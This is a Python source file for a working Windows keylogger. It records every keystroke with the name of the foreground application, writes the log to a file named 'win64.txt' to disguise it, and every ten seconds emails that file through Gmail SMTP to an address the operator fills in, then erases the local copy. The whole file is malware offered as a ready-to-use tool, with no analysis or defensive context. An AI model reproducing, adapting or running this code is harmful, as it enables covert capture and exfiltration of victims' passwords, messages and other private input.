from pynput import keyboard
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from multiprocessing import Process, freeze_support
from time import sleep
import win32gui
import win32process
import psutil
import os, sys
import smtplib, ssl

prev_process = ""

def resource_path(relative_path):
    try:
        base_path = sys._MEI_PASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_current_process():
    dontcare, pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
    current_process = psutil.Process(pid).name()
    return current_process[0:3]

def check_line_integrity():
    global prev_process
    cur_process = get_current_process()
    if(prev_process != cur_process):
        file = open(resource_path("win64.txt"), "a")
        file.write("\n" + cur_process + "- ")
        file.close()
        prev_process = cur_process
    file = open(resource_path("win64.txt"), "r+")
    line = ""
    for line in file:
        pass
    last_line = line
    file.close()
    if(len(last_line) > 100 or len(last_line) < 1):
        file = open(resource_path("win64.txt"), "a")
        file.write("\n" + get_current_process() + "- ")
        file.close()

def on_press(key):
    check_line_integrity()
    try:
        file = open(resource_path("win64.txt"), "a")
        file.write(key.char)
    except AttributeError:
        if(key == keyboard.Key.space):
            file = open(resource_path("win64.txt"), "a")
            file.write(" ")
        elif(key == keyboard.Key.backspace):
            file = open(resource_path("win64.txt"), "r+")
            if((file.read())[-5] != "\n"):
                file.close()
                file = open(resource_path("win64.txt"), "ab+")
                file.seek(-1, os.SEEK_CUR)
                file.truncate()
        elif(key != keyboard.Key.esc and key != keyboard.Key.shift_l):
            file = open(resource_path("win64.txt"), "a")
            file.write("<" + str(key).split('.')[1].upper() + ">")
    except TypeError:
        file = open(resource_path("win64.txt"), "a")
        file.write("<FN>")
    file.close()

listener = keyboard.Listener(
    on_press = on_press
)

def clear():
    while(True):
        sleep(10.0)
        f = "win64.txt"
        email_sender = "YOUR_EMAIL_HERE@gmail.com"
        email_receiver = "YOUR_EMAIL_HERE@gmail.com"
        password = "APP_PASSWORD_HERE"
        subject = "SUBJECT"
        body= """\
                LOREMIPSUM"""
        port = 587
        
        message = MIMEMultipart()
        message["From"] = email_sender
        message["To"] = email_receiver
        message["Subject"] = subject

        partTxt = MIMEText(body, "plain")
        message.attach(partTxt)

        with open(resource_path(f), 'rb+') as attachment:
            partFile = MIMEBase("application", "octet-stream")
            partFile.set_payload(attachment.read())
            encoders.encode_base64(partFile)
            partFile.add_header("Content-Disposition", f"attachment; filename= {f}",)
            message.attach(partFile)
            text = message.as_string()
            context = ssl.create_default_context()
            with smtplib.SMTP("smtp.gmail.com", port) as server:
                server.starttls(context=context)
                try:
                    server.login(email_sender, password)
                    server.sendmail(email_sender, email_receiver, text)
                    server.quit()
                except Exception:
                    print("Password or email incorrect/nonexistent.")
            attachment.truncate(0)
            attachment.close()

if __name__ == '__main__':
    freeze_support()
    if not os.path.exists(resource_path("win64.txt")):
        with open(resource_path("win64.txt"), 'w'): pass
    p2 = Process(target=clear)
    p2.start()
    listener.start()
    p2.join()
    listener.join()